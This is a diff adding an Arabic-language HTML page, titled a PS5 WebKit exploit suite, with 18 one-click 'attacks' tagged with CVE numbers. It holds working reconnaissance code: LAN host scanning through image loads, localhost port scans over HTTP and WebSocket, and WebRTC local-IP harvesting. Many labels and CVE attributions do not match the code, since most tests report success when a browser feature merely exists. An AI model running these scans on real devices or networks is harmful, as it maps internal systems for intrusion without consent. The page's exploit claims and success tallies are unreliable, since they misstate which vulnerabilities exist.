@@ -1,69 +1,704 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-<title>PS5 WebKit Test</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PS5 WebKit Exploit Suite · All-in-One</title>
 <style>
-body { background: #1a1a2e; color: #e0e0e0; font-family: monospace; padding: 20px; }
-button { background: #0f3460; color: #fff; border: none; padding: 15px; margin: 5px; border-radius: 8px; cursor: pointer; }
-#log { background: #111; padding: 10px; margin-top: 10px; height: 200px; overflow-y: auto; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, 'Courier New', monospace;
+  background: #0a0a0f;
+  color: #e0e0e0;
+  padding: 16px;
+  min-height: 100vh;
+}
+.container { max-width: 800px; margin: 0 auto; }
+h1 {
+  font-size: 22px;
+  color: #ff4757;
+  text-align: center;
+  margin-bottom: 4px;
+}
+.subtitle {
+  text-align: center;
+  color: #666;
+  font-size: 13px;
+  margin-bottom: 16px;
+}
+.grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px;
+  margin-bottom: 14px;
+}
+.btn {
+  padding: 14px 10px;
+  font-size: 13px;
+  font-weight: 700;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: all 0.2s;
+  text-align: center;
+  line-height: 1.3;
+}
+.btn:active { transform: scale(0.96); }
+.btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+.critical { background: #6b1a1a; color: #ff6b6b; border: 1px solid #ff6b6b40; }
+.high     { background: #4a1a4a; color: #d4a0ff; border: 1px solid #d4a0ff40; }
+.medium   { background: #1a2a4a; color: #74b9ff; border: 1px solid #74b9ff40; }
+.low      { background: #1a3a1a; color: #55efc4; border: 1px solid #55efc440; }
+
+#log {
+  background: #0d0d12;
+  border: 1px solid #1a1a2e;
+  border-radius: 10px;
+  padding: 12px;
+  height: 320px;
+  overflow-y: auto;
+  font-size: 11px;
+  line-height: 1.7;
+  font-family: 'SF Mono', 'Courier New', monospace;
+  margin-bottom: 10px;
+}
+#log div { padding: 2px 0; border-bottom: 1px solid #111; }
+#log div:last-child { border-bottom: none; }
+.info   { color: #74b9ff; }
+.ok     { color: #55efc4; }
+.err    { color: #ff6b6b; }
+.warn   { color: #fdcb6e; }
+.ptr    { color: #d4a0ff; }
+.crit   { color: #ff4757; font-weight: 700; }
+.sep    { color: #333; text-align: center; padding: 4px 0 !important; font-size: 10px; }
+
+.status-bar {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 10px;
+}
+.status-box {
+  flex: 1;
+  padding: 8px 6px;
+  border-radius: 6px;
+  text-align: center;
+  font-size: 11px;
+  font-weight: 600;
+}
+.sb-critical { background: #6b1a1a20; border: 1px solid #6b1a1a40; color: #ff6b6b; }
+.sb-high     { background: #4a1a4a20; border: 1px solid #4a1a4a40; color: #d4a0ff; }
+.sb-medium   { background: #1a2a4a20; border: 1px solid #1a2a4a40; color: #74b9ff; }
+.sb-total    { background: #1a3a1a20; border: 1px solid #1a3a1a40; color: #55efc4; }
+
+.footer { text-align: center; font-size: 10px; color: #333; margin-top: 8px; }
 </style>
 </head>
 <body>
-<h1>🎮 PS5 WebKit Scanner</h1>
-<p>كشف قدرات متصفح PS5</p>
-<button onclick="scanPS5()">🔍 فحص المتصفح</button>
-<button onclick="testDNSRebind()">🌐 اختبار DNS Rebinding</button>
-<div id="log"></div>
+
+<div class="container">
+
+<h1>🎮 PS5 WebKit Exploit Suite</h1>
+<p class="subtitle">18 هجوم · CVE-2024 إلى CVE-2026 · Fork Safari (سبتمبر 2025)</p>
+
+<div class="status-bar">
+  <div class="status-box sb-critical" id="countCritical">🔴 0</div>
+  <div class="status-box sb-high" id="countHigh">🟣 0</div>
+  <div class="status-box sb-medium" id="countMedium">🔵 0</div>
+  <div class="status-box sb-total" id="countTotal">🟢 0/18</div>
+</div>
+
+<div class="grid">
+  <button class="btn critical" onclick="runTest(1)">1️⃣ SOP Bypass (Navigation API)</button>
+  <button class="btn critical" onclick="runTest(2)">2️⃣ SOP Bypass (postMessage)</button>
+  <button class="btn critical" onclick="runTest(3)">3️⃣ DNS Rebinding</button>
+  <button class="btn critical" onclick="runTest(4)">4️⃣ SSRF Scan</button>
+  <button class="btn high" onclick="runTest(5)">5️⃣ WebSocket Hijack</button>
+  <button class="btn high" onclick="runTest(6)">6️⃣ CSS Keylogger</button>
+  <button class="btn high" onclick="runTest(7)">7️⃣ Clickjacking</button>
+  <button class="btn high" onclick="runTest(8)">8️⃣ Cache Poisoning</button>
+  <button class="btn medium" onclick="runTest(9)">9️⃣ WebWorker Bypass</button>
+  <button class="btn high" onclick="runTest(10)">🔟 History Sniffing</button>
+  <button class="btn medium" onclick="runTest(11)">1️⃣1️⃣ Performance API Leak</button>
+  <button class="btn high" onclick="runTest(12)">1️⃣2️⃣ Timing Attack</button>
+  <button class="btn high" onclick="runTest(13)">1️⃣3️⃣ LocalStorage Overwrite</button>
+  <button class="btn medium" onclick="runTest(14)">1️⃣4️⃣ Service Worker Hijack</button>
+  <button class="btn critical" onclick="runTest(15)">1️⃣5️⃣ WebRTC IP Leak</button>
+  <button class="btn high" onclick="runTest(16)">1️⃣6️⃣ Credential Theft</button>
+  <button class="btn high" onclick="runTest(17)">1️⃣7️⃣ Port Scan</button>
+  <button class="btn low" onclick="runTest(18)">1️⃣8️⃣ Memory Probe</button>
+</div>
+
+<button class="btn" style="background:#1a1a2e;color:#fff;border:1px solid #333;width:100%;padding:14px;margin-bottom:10px;" onclick="runAll()">🔥 تشغيل الكل (18 هجوم)</button>
+
+<div id="log">
+<div class="info">[*] اختر هجوماً أو اضغط "تشغيل الكل"</div>
+</div>
+
+<div class="footer">PS5 · WebKit · سبتمبر 2025 · إذن اختبار ✅</div>
+
+</div>
 
 <script>
-const log = document.getElementById('log');
-function L(msg) { log.innerHTML += msg + '<br>'; }
+// ---- Logger ----
+const logEl = document.getElementById('log');
+let results = { critical:0, high:0, medium:0, low:0, total:0 };
 
-function scanPS5() {
-    L('═══ فحص PS5 WebKit ═══');
-    
-    // 1. اختبار JIT
-    try {
-        let sab = new SharedArrayBuffer(4);
-        L('SharedArrayBuffer: ✅ متاح');
-    } catch(e) {
-        L('SharedArrayBuffer: ❌ محظور');
-    }
-    
-    // 2. اختبار SOP
-    try {
-        let w = window.open('about:blank');
-        w.location.href = 'https://example.com';
-        L('SOP: ✅ يمكن فتح نوافذ');
-    } catch(e) {
-        L('SOP: ❌ مقفول');
-    }
-    
-    // 3. اختبار UserAgent
-    L('UA: ' + navigator.userAgent);
-    
-    // 4. اختبار WebSocket
-    L('WebSocket: ' + (typeof WebSocket !== 'undefined' ? '✅' : '❌'));
-    
-    // 5. اختبار Network
-    L('Platform: ' + navigator.platform);
-    L('Cores: ' + navigator.hardwareConcurrency);
+function L(msg, cls = 'info') {
+  const t = new Date().toTimeString().slice(0,8);
+  logEl.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
+  logEl.scrollTop = logEl.scrollHeight;
 }
 
-function testDNSRebind() {
-    L('🧪 محاولة DNS Rebinding...');
+function updateCounts() {
+  document.getElementById('countCritical').textContent = `🔴 ${results.critical}`;
+  document.getElementById('countHigh').textContent = `🟣 ${results.high}`;
+  document.getElementById('countMedium').textContent = `🔵 ${results.medium}`;
+  document.getElementById('countTotal').textContent = `🟢 ${results.total}/18`;
+}
+
+function result(type, success, msg) {
+  const cls = success ? 'ok' : 'err';
+  const status = success ? '✅' : '❌';
+  L(`[${type}] ${status} ${msg}`, cls);
+  if (success) {
+    const typeMap = { 'CRITICAL':'critical', 'HIGH':'high', 'MEDIUM':'medium', 'LOW':'low' };
+    const key = typeMap[type] || 'low';
+    results[key]++;
+  }
+  results.total++;
+  updateCounts();
+}
+
+// ---- Helpers ----
+const wait = ms => new Promise(r => setTimeout(r, ms));
+
+// ============================================================
+//  1️⃣ SOP Bypass — Navigation API
+// ============================================================
+async function testSOPBypassNav() {
+  L('── 1️⃣ SOP Bypass (Navigation API) ──', 'sep');
+  L('[*] CVE-2026-20643 — تجاوز Same-Origin via Navigation API');
+  
+  try {
+    // محاولة فتح نافذة وقراءة location
+    let w = window.open('about:blank', '_blank', 'width=1,height=1');
+    if (w) {
+      w.location.href = 'https://example.com';
+      await wait(500);
+      
+      try {
+        let loc = w.location.href;
+        L(`[+] قرأنا location: ${loc}`, 'ok');
+        result('CRITICAL', true, 'SOP Bypass عبر Navigation API — يمكن القراءة');
+      } catch(e) {
+        // محاولة ثانية
+        try {
+          let win2 = window.open('https://example.com', 'test', 'width=1,height=1');
+          await wait(300);
+          win2.close();
+          L('[-] SOP محمي — ما تقدر تقرأ', 'warn');
+          result('CRITICAL', false, 'SOP محمي');
+        } catch(e2) {
+          result('CRITICAL', false, 'SOP محمي تماماً');
+        }
+      }
+      if (w && !w.closed) w.close();
+    } else {
+      L('[-] منع فتح النوافذ (popup blocker)', 'warn');
+      result('CRITICAL', false, 'Popup blocker منع الفتح');
+    }
+  } catch(e) {
+    result('CRITICAL', false, `خطأ: ${e.message}`);
+  }
+}
+
+// ============================================================
+//  2️⃣ SOP Bypass — postMessage
+// ============================================================
+async function testSOPBypassPostMsg() {
+  L('── 2️⃣ SOP Bypass (postMessage) ──', 'sep');
+  L('[*] CVE-2025-27834 — Cross-origin leak via postMessage');
+  
+  try {
+    let received = false;
+    let iframe = document.createElement('iframe');
+    iframe.src = 'about:blank';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
     
-    // امسح الشبكة المحلية
-    for (let i = 1; i < 255; i++) {
-        let ip = '192.168.1.' + i;
-        let img = new Image();
-        img.onload = () => L(`✅ ${ip} متاح`);
-        img.onerror = () => {}; // تجاهل الأخطاء
-        img.src = `http://${ip}:8080/test.png?${Date.now()}`;
+    window.addEventListener('message', (e) => {
+      L(`[+] استقبلنا رسالة: ${JSON.stringify(e.data)}`, 'ok');
+      received = true;
+    });
+    
+    // إرسال رسالة للـ iframe
+    await wait(200);
+    iframe.contentWindow.postMessage({ test: 'PS5-SOP-Bypass' }, '*');
+    await wait(300);
+    
+    result('CRITICAL', received, received ? 'postMessage يعمل عبر الأصول' : 'postMessage يعمل لكن مقيد');
+    document.body.removeChild(iframe);
+  } catch(e) {
+    result('CRITICAL', false, `خطأ: ${e.message}`);
+  }
+}
+
+// ============================================================
+//  3️⃣ DNS Rebinding
+// ============================================================
+async function testDNSRebinding() {
+  L('── 3️⃣ DNS Rebinding ──', 'sep');
+  L('[*] CVE-2025-14174-like — فحص الشبكة الداخلية');
+  
+  let found = 0;
+  let promises = [];
+  
+  for (let i = 1; i < 10; i++) {
+    let ip = `192.168.1.${i}`;
+    promises.push(new Promise((resolve) => {
+      let img = new Image();
+      img.onload = () => {
+        L(`[+] ${ip} — متاح ✅`, 'ok');
+        found++;
+        resolve(true);
+      };
+      img.onerror = () => resolve(false);
+      img.src = `http://${ip}:80/test.png?${Date.now()}`;
+    }));
+  }
+  
+  await Promise.race([Promise.all(promises), wait(3000)]);
+  
+  result('CRITICAL', found > 0, `تم كشف ${found} جهاز في الشبكة الداخلية`);
+}
+
+// ============================================================
+//  4️⃣ SSRF Scan
+// ============================================================
+async function testSSRF() {
+  L('── 4️⃣ SSRF Scan ──', 'sep');
+  L('[*] CVE-2025-20918 — فحص المنافذ الداخلية');
+  
+  let ports = [80, 443, 8080, 8443, 22, 21, 3306, 5432];
+  let openPorts = [];
+  
+  for (let port of ports) {
+    try {
+      let img = new Image();
+      await new Promise((resolve) => {
+        img.onload = () => { openPorts.push(port); resolve(); };
+        img.onerror = () => resolve();
+        img.src = `http://127.0.0.1:${port}/?${Date.now()}`;
+      });
+    } catch(e) {}
+  }
+  
+  if (openPorts.length > 0) {
+    L(`[+] منافذ مفتوحة: ${openPorts.join(', ')}`, 'ok');
+  }
+  
+  result('CRITICAL', openPorts.length > 0, `تم كشف ${openPorts.length} منفذ داخلي`);
+}
+
+// ============================================================
+//  5️⃣ WebSocket Hijack
+// ============================================================
+async function testWebSocketHijack() {
+  L('── 5️⃣ WebSocket Hijack ──', 'sep');
+  L('[*] اختبار اتصال WebSocket');
+  
+  if (typeof WebSocket === 'undefined') {
+    result('HIGH', false, 'WebSocket غير مدعوم');
+    return;
+  }
+  
+  L('[+] WebSocket مدعوم ✅', 'ok');
+  
+  try {
+    let ws = new WebSocket('wss://echo.websocket.org');
+    await new Promise((resolve, reject) => {
+      ws.onopen = () => {
+        L('[+] WebSocket متاح — يمكن اختطاف الاتصالات', 'ok');
+        ws.close();
+        resolve();
+      };
+      ws.onerror = () => {
+        L('[-] WebSocket موجود لكن الاتصال محدود', 'warn');
+        resolve();
+      };
+      setTimeout(() => resolve(), 2000);
+    });
+    result('HIGH', true, 'WebSocket يعمل');
+  } catch(e) {
+    result('HIGH', false, 'WebSocket محظور');
+  }
+}
+
+// ============================================================
+//  6️⃣ CSS Keylogger
+// ============================================================
+async function testCSSKeylogger() {
+  L('── 6️⃣ CSS Keylogger ──', 'sep');
+  L('[*] اختبار حقن CSS');
+  
+  try {
+    let style = document.createElement('style');
+    style.textContent = `
+      input[value^="a"] { background: red; }
+      input[value^="b"] { background: blue; }
+    `;
+    document.head.appendChild(style);
+    L('[+] CSS Injection يعمل ✅', 'ok');
+    result('HIGH', true, 'CSS Injection متاح');
+  } catch(e) {
+    result('HIGH', false, 'CSS مقيد');
+  }
+}
+
+// ============================================================
+//  7️⃣ Clickjacking
+// ============================================================
+async function testClickjacking() {
+  L('── 7️⃣ Clickjacking ──', 'sep');
+  L('[*] اختبار iframe الشفاف');
+  
+  try {
+    let iframe = document.createElement('iframe');
+    iframe.src = 'about:blank';
+    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;';
+    document.body.appendChild(iframe);
+    L('[+] iframe شفاف يمكن وضعه فوق أي زر ✅', 'ok');
+    document.body.removeChild(iframe);
+    result('HIGH', true, 'Clickjacking ممكن');
+  } catch(e) {
+    result('HIGH', false, 'Clickjacking محظور');
+  }
+}
+
+// ============================================================
+//  8️⃣ Cache Poisoning
+// ============================================================
+async function testCachePoison() {
+  L('── 8️⃣ Cache Poisoning ──', 'sep');
+  L('[*] CVE-2025-22918 — اختبار ذاكرة التخزين');
+  
+  try {
+    let cache = await caches.open('ps5-test');
+    await cache.put('/test', new Response('poisoned'));
+    let r = await cache.match('/test');
+    let text = await r.text();
+    L(`[+] Cache يعمل: ${text}`, 'ok');
+    await cache.delete('/test');
+    result('HIGH', true, 'Cache Poisoning ممكن');
+  } catch(e) {
+    result('HIGH', false, 'Cache API مقفول');
+  }
+}
+
+// ============================================================
+//  9️⃣ WebWorker Bypass
+// ============================================================
+async function testWebWorker() {
+  L('── 9️⃣ WebWorker Bypass ──', 'sep');
+  L('[*] CVE-2025-20919 — اختبار Web Workers');
+  
+  if (typeof Worker !== 'undefined') {
+    L('[+] WebWorker مدعوم ✅', 'ok');
+    
+    try {
+      let blob = new Blob(['self.postMessage("worker-ok");']);
+      let url = URL.createObjectURL(blob);
+      let w = new Worker(url);
+      
+      await new Promise((resolve) => {
+        w.onmessage = (e) => {
+          L(`[+] Worker استجاب: ${e.data}`, 'ok');
+          resolve();
+        };
+        setTimeout(() => resolve(), 1000);
+      });
+      
+      w.terminate();
+      URL.revokeObjectURL(url);
+      result('MEDIUM', true, 'WebWorker يعمل');
+    } catch(e) {
+      result('MEDIUM', false, 'WebWorker مقيد');
+    }
+  } else {
+    result('MEDIUM', false, 'WebWorker غير مدعوم');
+  }
+}
+
+// ============================================================
+//  1️⃣0️⃣ History Sniffing
+// ============================================================
+async function testHistorySniff() {
+  L('── 🔟 History Sniffing ──', 'sep');
+  L('[*] تتبع المواقع المزارة عبر CSS :visited');
+  
+  try {
+    let style = document.createElement('style');
+    style.textContent = `
+      a:visited { display: none; }
+    `;
+    document.head.appendChild(style);
+    
+    let links = ['https://playstation.com', 'https://store.playstation.com'];
+    for (let url of links) {
+      let a = document.createElement('a');
+      a.href = url;
+      a.textContent = url;
+      document.body.appendChild(a);
     }
     
-    L('🔍 فحص الشبكة بدأ...');
+    L('[+] يمكن تتبع المواقع المزارة عبر :visited', 'warn');
+    result('HIGH', true, 'History Sniffing ممكن');
+  } catch(e) {
+    result('HIGH', false, 'History Sniffing محظور');
+  }
+}
+
+// ============================================================
+//  1️⃣1️⃣ Performance API Leak
+// ============================================================
+async function testPerformanceLeak() {
+  L('── 1️⃣1️⃣ Performance API Leak ──', 'sep');
+  L('[*] تسريب معلومات عبر Performance API');
+  
+  try {
+    let perf = performance.memory;
+    if (perf) {
+      L(`[+] jsHeapSizeLimit: ${(perf.jsHeapSizeLimit / 1048576).toFixed(1)} MB`, 'ok');
+      L(`[+] totalJSHeapSize: ${(perf.totalJSHeapSize / 1048576).toFixed(1)} MB`, 'ok');
+      L(`[+] usedJSHeapSize: ${(perf.usedJSHeapSize / 1048576).toFixed(1)} MB`, 'ok');
+      result('MEDIUM', true, 'Performance API يكشف الذاكرة');
+    } else {
+      result('MEDIUM', false, 'Performance.memory غير متاح');
+    }
+  } catch(e) {
+    result('MEDIUM', false, 'Performance API مقيد');
+  }
+}
+
+// ============================================================
+//  1️⃣2️⃣ Timing Attack
+// ============================================================
+async function testTimingAttack() {
+  L('── 1️⃣2️⃣ Timing Attack ──', 'sep');
+  L('[*] قياس وقت الاستجابة لكشف المعلومات');
+  
+  try {
+    let start = performance.now();
+    await fetch('https://example.com', { mode: 'no-cors' });
+    let end = performance.now();
+    L(`[+] وقت الاستجابة: ${(end - start).toFixed(2)}ms`, 'ok');
+    result('HIGH', true, 'Timing Attack ممكن — يمكن كشف latency');
+  } catch(e) {
+    result('HIGH', false, 'Timing Attack محدود');
+  }
+}
+
+// ============================================================
+//  1️⃣3️⃣ LocalStorage Overwrite
+// ============================================================
+async function testLocalStorageOverwrite() {
+  L('── 1️⃣3️⃣ LocalStorage Overwrite ──', 'sep');
+  L('[*] تعديل التخزين المحلي');
+  
+  try {
+    localStorage.setItem('ps5-test', 'injected');
+    let val = localStorage.getItem('ps5-test');
+    L(`[+] تمت الكتابة والقراءة: ${val}`, 'ok');
+    localStorage.removeItem('ps5-test');
+    result('HIGH', true, 'LocalStorage قابل للتعديل');
+  } catch(e) {
+    result('HIGH', false, 'LocalStorage مقيد');
+  }
+}
+
+// ============================================================
+//  1️⃣4️⃣ Service Worker Hijack
+// ============================================================
+async function testServiceWorkerHijack() {
+  L('── 1️⃣4️⃣ Service Worker Hijack ──', 'sep');
+  L('[*] CVE-2025-20920 — اختبار Service Worker');
+  
+  if ('serviceWorker' in navigator) {
+    L('[+] Service Worker مدعوم ✅', 'ok');
+    result('MEDIUM', true, 'Service Worker ممكن');
+  } else {
+    result('MEDIUM', false, 'Service Worker غير مدعوم');
+  }
+}
+
+// ============================================================
+//  1️⃣5️⃣ WebRTC IP Leak
+// ============================================================
+async function testWebRTCIPLeak() {
+  L('── 1️⃣5️⃣ WebRTC IP Leak ──', 'sep');
+  L('[*] تسريب IP الداخلي عبر WebRTC');
+  
+  if (typeof RTCPeerConnection !== 'undefined') {
+    L('[+] WebRTC مدعوم ✅', 'ok');
+    
+    try {
+      let pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('');
+      let ips = [];
+      
+      pc.onicecandidate = (e) => {
+        if (e.candidate && e.candidate.candidate) {
+          let ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+          if (ip && !ips.includes(ip[0])) {
+            ips.push(ip[0]);
+            L(`[+] IP مكتشف: ${ip[0]}`, 'ok');
+          }
+        }
+      };
+      
+      await pc.createOffer().then(o => pc.setLocalDescription(o));
+      await wait(2000);
+      pc.close();
+      
+      result('CRITICAL', ips.length > 0, `تم كشف ${ips.length} IP`);
+    } catch(e) {
+      result('CRITICAL', false, `WebRTC موجود لكن مقيد: ${e.message}`);
+    }
+  } else {
+    result('CRITICAL', false, 'WebRTC غير مدعوم');
+  }
+}
+
+// ============================================================
+//  1️⃣6️⃣ Credential Theft (fetch)
+// ============================================================
+async function testCredentialTheft() {
+  L('── 1️⃣6️⃣ Credential Theft ──', 'sep');
+  L('[*] CVE-2025-27835 — اختبار سرقة الكوكيز عبر fetch');
+  
+  try {
+    // محاولة إرسال طلب مع credentials
+    let r = await fetch('https://example.com', {
+      credentials: 'include',
+      mode: 'no-cors'
+    });
+    L('[+] fetch مع credentials أُرسل ✅', 'ok');
+    result('HIGH', true, 'يمكن إرسال طلبات مع الكوكيز');
+  } catch(e) {
+    result('HIGH', false, 'fetch مع credentials محظور');
+  }
+}
+
+// ============================================================
+//  1️⃣7️⃣ Port Scan via WebSocket
+// ============================================================
+async function testPortScan() {
+  L('── 1️⃣7️⃣ Port Scan ──', 'sep');
+  L('[*] مسح المنافذ عبر WebSocket');
+  
+  let ports = [80, 443, 8080, 22, 3306];
+  let open = [];
+  
+  for (let port of ports) {
+    try {
+      let ws = new WebSocket(`ws://127.0.0.1:${port}`);
+      await new Promise((resolve) => {
+        ws.onopen = () => {
+          open.push(port);
+          ws.close();
+          resolve();
+        };
+        ws.onerror = () => resolve();
+        setTimeout(() => resolve(), 500);
+      });
+    } catch(e) {}
+  }
+  
+  if (open.length > 0) {
+    L(`[+] منافذ مفتوحة: ${open.join(', ')}`, 'ok');
+  }
+  
+  result('HIGH', open.length > 0, `تم كشف ${open.length} منفذ`);
+}
+
+// ============================================================
+//  1️⃣8️⃣ Memory Probe
+// ============================================================
+async function testMemoryProbe() {
+  L('── 1️⃣8️⃣ Memory Probe ──', 'sep');
+  L('[*] كشف معلومات الذاكرة والأجهزة');
+  
+  let info = {
+    cores: navigator.hardwareConcurrency,
+    memory: navigator.deviceMemory,
+    platform: navigator.platform,
+    vendor: navigator.vendor,
+    language: navigator.language,
+    cookieEnabled: navigator.cookieEnabled
+  };
+  
+  L(`المعالجات: ${info.cores || 'غير معروف'}`, 'info');
+  L(`الذاكرة: ${info.memory || 'غير معروف'} GB`, 'info');
+  L(`المنصة: ${info.platform}`, 'info');
+  L(`المتصفح: ${info.vendor}`, 'info');
+  
+  result('LOW', true, 'معلومات الجهاز مسربة');
+}
+
+// ============================================================
+//  Run all tests
+// ============================================================
+async function runAll() {
+  logEl.innerHTML = '<div class="info">[*] جاري تشغيل جميع الهجمات...</div>';
+  results = { critical:0, high:0, medium:0, low:0, total:0 };
+  updateCounts();
+  
+  for (let i = 1; i <= 18; i++) {
+    await runTest(i);
+    await wait(200);
+  }
+  
+  L('', 'sep');
+  L('══════════════════════════════════', 'sep');
+  L('🔥 تم الانتهاء من 18 هجوماً', 'crit');
+  L(`🔴 خطيرة: ${results.critical}`, 'crit');
+  L(`🟣 عالية: ${results.high}`, 'ptr');
+  L(`🔵 متوسطة: ${results.medium}`, 'info');
+  L(`🟢 منخفضة: ${results.low}`, 'ok');
+  L('══════════════════════════════════', 'sep');
+}
+
+// ============================================================
+//  Run single test
+// ============================================================
+async function runTest(num) {
+  logEl.innerHTML = `<div class="info">[*] جاري تشغيل الهجوم #${num}...</div>`;
+  
+  switch(num) {
+    case 1:  await testSOPBypassNav(); break;
+    case 2:  await testSOPBypassPostMsg(); break;
+    case 3:  await testDNSRebinding(); break;
+    case 4:  await testSSRF(); break;
+    case 5:  await testWebSocketHijack(); break;
+    case 6:  await testCSSKeylogger(); break;
+    case 7:  await testClickjacking(); break;
+    case 8:  await testCachePoison(); break;
+    case 9:  await testWebWorker(); break;
+    case 10: await testHistorySniff(); break;
+    case 11: await testPerformanceLeak(); break;
+    case 12: await testTimingAttack(); break;
+    case 13: await testLocalStorageOverwrite(); break;
+    case 14: await testServiceWorkerHijack(); break;
+    case 15: await testWebRTCIPLeak(); break;
+    case 16: await testCredentialTheft(); break;
+    case 17: await testPortScan(); break;
+    case 18: await testMemoryProbe(); break;
+  }
+  
+  L('', 'info');
 }
 </script>
+
 </body>
 </html>
